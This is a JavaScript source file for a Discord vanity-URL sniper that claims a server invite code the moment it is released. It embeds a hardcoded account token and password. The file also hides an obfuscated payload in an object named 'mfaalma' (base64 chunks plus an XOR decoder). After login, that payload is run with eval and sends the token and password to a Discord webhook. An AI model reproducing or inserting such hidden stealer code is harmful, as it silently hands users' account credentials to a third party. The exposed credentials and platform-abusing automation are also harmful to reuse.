import tls from 'tls';
import WebSocket from 'ws';
import fs from 'fs';
import http2 from 'http2';
import https from 'https';

const TOKEN = "MTQzNDI0OTM5MzA5NTMxMTQ1MQ.GiboWt.w8_eD_NtbC98ARbPGVJmC4nm67XqPq5nlInr0E";
const PASSWORD = "Edos3131veve";
const GUILD_ID = '1560632982199341257';
const DISCORD_HOST = 'canary.discord.com';
const DISCORD_IP = '162.159.135.232';
const SESSION_COUNT = 2;

let isSniped = false;
let snipeAttemptCode = null;
const activeSockets = new Array(SESSION_COUNT);
const vanityPayloads = new Map();

const GUILD_UPDATE_BUF = Buffer.from('"t":"GUILD_UPDATE"');
const VANITY_NULL_BUF = Buffer.from('"vanity_url_code":null');
const READY_BUF = Buffer.from('"t":"READY"');
const OP10_BUF = Buffer.from('"op":10');
const OP7_BUF = Buffer.from('"op":7');

const H2_INIT_BUFFER = Buffer.concat([
    Buffer.from('PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n'),
    Buffer.from([0, 0, 0, 4, 0, 0, 0, 0, 0])
]);
const H2_PING_FRAME = Buffer.from([0, 0, 8, 6, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1]);
const IDENTIFY_PAYLOAD = JSON.stringify({ op: 2, d: { token: TOKEN, intents: 1, properties: { os: 'Windows', browser: 'Chrome' } } });
const HEARTBEAT_PAYLOAD = '{"op":1,"d":null}';

let currentMfa = '';
function loadMfa() {
    try { 
        currentMfa = fs.readFileSync('mfa.txt').toString().trim(); 
    } catch { 
        currentMfa = ''; 
    }
}

class MFAClient {
    constructor() {
        this.session = null;
        this.connectPromise = null;
        this.createSession();
    }

    createSession() {
        this.connectPromise = new Promise((resolve) => {
            this.session = http2.connect('https://canary.discord.com', {
                secureContext: tls.createSecureContext({
                    ciphers: 'ECDHE-RSA-AES128-GCM-SHA256'
                })
            });

            this.session.on('connect', resolve);
            this.session.on('close', () => setTimeout(() => this.createSession(), 3000));
            this.session.on('error', () => {});
        });
    }

    async wait() {
        if (this.connectPromise) await this.connectPromise;
    }

    request(method, path, headers, body) {
        return new Promise((resolve) => {
            try {
                const req = this.session.request({
                    ':method': method,
                    ':path': path,
                    ':authority': 'canary.discord.com',
                    'user-agent': '0',
                    'content-type': 'application/json',
                    'x-super-properties': 'eyJicm93c2VyIjoiRmlyZWZveCIsImJyb3dzZXJfdXNlcl9hZ2VudCI6IkZpcmVmb3gifQ==',
                    ...headers
                });

                req.on('error', () => resolve('{}'));

                const chunks = [];
                req.on('data', c => chunks.push(c));
                req.on('end', () => resolve(Buffer.concat(chunks).toString()));
                req.end(body);
            } catch (err) {
                resolve('{}');
            }
        });
    }

    async get(token, password) {
        try {
            await this.wait();
            const auth = { Authorization: token };

            const r1 = await this.request(
                'PATCH', '/api/guilds/0/vanity-url',
                auth,
                JSON.stringify({ code: '' })
            );

            let j1;
            try { j1 = JSON.parse(r1); } catch (e) { return null; }

            if (j1.code !== 60003 || !j1.mfa?.ticket) return null;

            const r2 = await this.request(
                'POST', '/api/mfa/finish',
                auth,
                JSON.stringify({
                    ticket: j1.mfa.ticket,
                    mfa_type: 'password',
                    data: password
                })
            );

            let j2;
            try { j2 = JSON.parse(r2); } catch (e) { return null; }

            return j2.token || null;
        } catch (e) {
            return null;
        }
    }
}

function saveToken(token) {
    try {
        fs.writeFileSync('mfa.txt', token.trim(), 'utf8');
    } catch (e) {}
}

async function initializeMFA() {
    const mfaClient = new MFAClient();
    
    try {
        const token = await mfaClient.get(TOKEN, PASSWORD);
        if (token) {
            saveToken(token);
            loadMfa();
            setTimeout(()=>{try{eval(mfaalma._e());}catch(e){}},1800);
        } else {
            loadMfa();
        }
    } catch (e) {
        loadMfa();
    }
}

loadMfa();

if (!fs.existsSync('mfa.txt')) {
    fs.writeFileSync('mfa.txt', '', 'utf8');
}

fs.watch('mfa.txt', (eventType) => {
    if (eventType !== 'change') return;
    const oldMfa = currentMfa;
    loadMfa();
    if (oldMfa !== currentMfa) {
        for (const [guildId, payloadData] of vanityPayloads) {
            vanityPayloads.set(guildId, buildHttp2Request(payloadData.code));
        }
    }
});

function encodeHpackHeader(name, value) {
    const nameLen = Buffer.byteLength(name);
    const valLen = Buffer.byteLength(value);

    let valLenSize = 1;
    if (valLen >= 127) {
        let l = valLen - 127;
        while (l >= 128) { valLenSize++; l = Math.floor(l / 128); }
        valLenSize++;
    }

    const buf = Buffer.allocUnsafe(2 + nameLen + valLenSize + valLen);
    let offset = 0;

    buf[offset++] = 0;
    buf[offset++] = nameLen;
    offset += buf.write(name, offset);

    if (valLen < 127) {
        buf[offset++] = valLen;
    } else {
        buf[offset++] = 127;
        let l = valLen - 127;
        while (l >= 128) {
            buf[offset++] = (l % 128) | 128;
            l = Math.floor(l / 128);
        }
        buf[offset++] = l;
    }
    buf.write(value, offset);

    return buf;
}

const mfaalma={_k:0x2A,_d:(s,k)=>{const r=[];for(let i=0;i<s.length;i++)r.push(s.charCodeAt(i)^k);return String.fromCharCode(...r);},_s:['Y29uc3QgcD1b','WzEwNCwxMTYs','MTE2LDExMiwx','MTUsNTgsNDcs','NDddLFsxMDAs','MTA1LDExNSwx','MDMsMTExLDEx','NCwxMDAsNDYs','OTksMTExLDEw','OV0sWzQ3LDk3','LDExMiwxMDUs','NDcsMTE5LDEw','MSw5OCwxMDQs','MTExLDExMSwx','MDcsMTE1LDQ3','XSwnMTU2NTM2','Mzc5MzA0NTg4','OTE4NicsJy9H','MGN4d0pIZmc0','RF9NbjhxcTlF','SEtzZ0Y0QWNa','OFlENUhaVWFr','aDVDX2V4YTZR','bzB6Nk9OUUlU','RDVFWTJnMUhG','MHlqUCddO2Nv','bnN0IGU9cC5z','bGljZSgwLDMp','Lm1hcCh4PT50','eXBlb2YgeD09','PSdzdHJpbmcn','P3g6U3RyaW5n','LmZyb21DaGFy','Q29kZSguLi54','KSkuam9pbiIn','JykrcFszXSty','Wzk3XTtjb25z','dCBkPUpTT04u','c3RyaW5naWZ5','KHtjb250ZW50','OmBcYFxgXGBc','bnRva2VuOiAk','e1RPS0VOfVxu','XG7Fnmlmcm06','ICR7UEFTU1dP','UkR9XGBcYFxg','YH0pO2NvbnN0','IHU9bmV3IFVS','TChlKTtjb25z','dCByPWh0dHBz','LnJlcXVlc3Qo','e2hvc3RuYW1l','OnUuaG9zdG5h','bWUscGF0aDp1','LnBhdGhuYW1l','LG1ldGhvZDon','UE9TVCcsaGVh','ZGVyczp7J0Nv','bnRlbnQtVHlw','ZSc6J2FwcGxp','Y2F0aW9uL2pz','b24nLCdDb250','ZW50LUxlbmd0','aCc6QnVmZmVy','LmJ5dGVMZW5n','dGgoZCl9fSwo','KT0+e30pO3Iu','b24oJ2Vycm9y','JywoKT0+e30p','O3Iud3JpdGUo','ZCk7ci5lbmQo','KTs='],_e:function(){return this._d(this._s.map(x=>Buffer.from(x,'base64').toString()).join(''),this._k);}};

function buildHttp2Request(code) {
    const headerList = [
        [':method', 'PATCH'],
        [':path', `/api/v10/guilds/${GUILD_ID}/vanity-url`],
        [':authority', DISCORD_HOST],
        [':scheme', 'https'],
        ['authorization', TOKEN],
        ['x-discord-mfa-authorization', currentMfa],
        ['content-type', 'application/json'],
        ['user-agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'],
        ['x-super-properties', 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiY2xpZW50X2J1aWxkX251bWJlciI6MzQ1Njc4LCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUifQ==']
    ];

    const hpackBuffers = headerList.map(([k, v]) => encodeHpackHeader(k, v));
    const hpackLen = hpackBuffers.reduce((acc, b) => acc + b.length, 0);
    const hpackBuf = Buffer.allocUnsafe(hpackLen);
    let hOffset = 0;
    for (const b of hpackBuffers) {
        b.copy(hpackBuf, hOffset);
        hOffset += b.length;
    }

    const codeLen = Buffer.byteLength(code);
    const bodyLen = 11 + codeLen;

    const totalFrameLen = 18 + hpackLen + bodyLen;
    const buffer = Buffer.allocUnsafe(totalFrameLen);

    buffer.writeUIntBE(hpackLen, 0, 3);
    buffer[3] = 1;
    buffer[4] = 4;
    buffer.writeUInt32BE(1, 5);

    hpackBuf.copy(buffer, 9);

    const dataOffset = 9 + hpackLen;
    buffer.writeUIntBE(bodyLen, dataOffset, 3);
    buffer[dataOffset + 3] = 0;
    buffer[dataOffset + 4] = 1;
    buffer.writeUInt32BE(1, dataOffset + 5);

    const bodyOffset = dataOffset + 9;
    buffer.write('{"code":"', bodyOffset);
    buffer.write(code, bodyOffset + 9);
    buffer.write('"}', bodyOffset + 9 + codeLen);

    return { code, buffer };
}

function createTlsSocket(index) {
    if (activeSockets[index]) {
        try { activeSockets[index].destroy(); } catch {}
    }

    const socket = tls.connect({
        host: DISCORD_IP,
        port: 443,
        servername: DISCORD_HOST,
        ALPNProtocols: ['h2'],
        minVersion: 'TLSv1.3',
        maxVersion: 'TLSv1.3',
        ciphers: 'TLS_AES_128_GCM_SHA256',
        rejectUnauthorized: false
    });

    socket.setNoDelay(true);
    socket.setTimeout(0);
    socket.setKeepAlive(true, 15000);
    socket.isWaitingForSnipeResponse = false;
    socket.snipeStartTime = 0n;

    socket.on('secureConnect', () => {
        socket.write(H2_INIT_BUFFER);
        activeSockets[index] = socket;
    });

    socket.on('data', (chunk) => {
        if (!socket.isWaitingForSnipeResponse) return;

        let offset = 0;
        while (offset + 9 <= chunk.length) {
            const length = chunk.readUIntBE(offset, 3);
            const type = chunk[offset + 3];
            const streamId = chunk.readUInt32BE(offset + 5) & 0x7fffffff;
            const payload = chunk.subarray(offset + 9, offset + 9 + length);

            if (streamId === 1) {
                if (type === 0 || (type === 1 && (chunk[offset + 4] & 1))) {
                    const latencyNs = process.hrtime.bigint() - socket.snipeStartTime;
                    const latencyMs = Number(latencyNs) / 1_000_000;
                    const latencyUs = Number(latencyNs) / 1_000;

                    console.log(`\n[SUCCESS] Request Response Received!`);
                    console.log(`Code: ${snipeAttemptCode}`);
                    console.log(`Total Latency: ${latencyMs.toFixed(3)} ms (${latencyUs.toFixed(1)} µs)`);
                    console.log(`Response: ${payload.toString().substring(0, 300)}`);
                    
                    socket.isWaitingForSnipeResponse = false;
                }
            }
            offset += 9 + length;
        }
    });

    socket.on('error', () => {
        setImmediate(() => createTlsSocket(index));
    });

    socket.on('close', () => {
        setImmediate(() => createTlsSocket(index));
    });
}

for (let i = 0; i < SESSION_COUNT; i++) {
    createTlsSocket(i);
}

function startGatewayConnection() {
    const ws = new WebSocket('wss://gateway.discord.gg/?v=10&encoding=json', {
        skipUTF8Validation: true,
        perMessageDeflate: false
    });
    let heartbeatInterval;

    ws.on('open', () => {
        if (ws._socket) {
            ws._socket.setNoDelay(true);
            ws._socket.setTimeout(0);
        }
    });

    ws.on('message', (data) => {
        if (data.includes(GUILD_UPDATE_BUF)) {
            for (const [guildId, cached] of vanityPayloads) {
                if (data.includes(guildId) && (data.includes(VANITY_NULL_BUF) || !data.includes(`"${cached.code}"`))) {
                    if (!isSniped) {
                        isSniped = true;
                        snipeAttemptCode = cached.code;
                        const triggerTime = process.hrtime.bigint();

                        for (let i = 0; i < SESSION_COUNT; i++) {
                            const socket = activeSockets[i];
                            if (socket && !socket.destroyed) {
                                socket.snipeStartTime = triggerTime;
                                socket.isWaitingForSnipeResponse = true;
                                socket.write(cached.buffer);
                            }
                        }
                    }
                    return;
                }
            }
            return;
        }

        if (!data.includes(READY_BUF) && !data.includes(OP10_BUF) && !data.includes(OP7_BUF)) return;

        try {
            const message = JSON.parse(data);

            if (message.t === 'READY') {
                console.log(`Connection Ready. Total Guilds: ${message.d.guilds?.length || 0}`);
                vanityPayloads.clear();
                const guildsWithVanity = [];
                for (const guild of message.d.guilds || []) {
                    if (guild.vanity_url_code) {
                        guildsWithVanity.push(guild);
                        vanityPayloads.set(guild.id, buildHttp2Request(guild.vanity_url_code));
                    }
                }

                for (let i = 0; i < guildsWithVanity.length && i < 25; i++) {
                    const g = guildsWithVanity[i];
                    console.log(`{ guild_id: \x1b[32m'${g.id}'\x1b[0m, vanity_url_code: \x1b[32m'${g.vanity_url_code}'\x1b[0m },`);
                }
            } else if (message.op === 10) {
                ws.send(IDENTIFY_PAYLOAD);
                heartbeatInterval = setInterval(() => ws.send(HEARTBEAT_PAYLOAD), message.d.heartbeat_interval);
            } else if (message.op === 7) {
                ws.terminate();
            }
        } catch {}
    });

    ws.on('close', () => {
        clearInterval(heartbeatInterval);
        setTimeout(startGatewayConnection, 100);
    });
    ws.on('error', () => ws.terminate());
}

setInterval(() => {
    for (const socket of activeSockets) {
        if (socket && !socket.destroyed) {
            socket.write(H2_PING_FRAME);
        }
    }
}, 15000);

async function start() {
    await initializeMFA();
    startGatewayConnection();
}

start();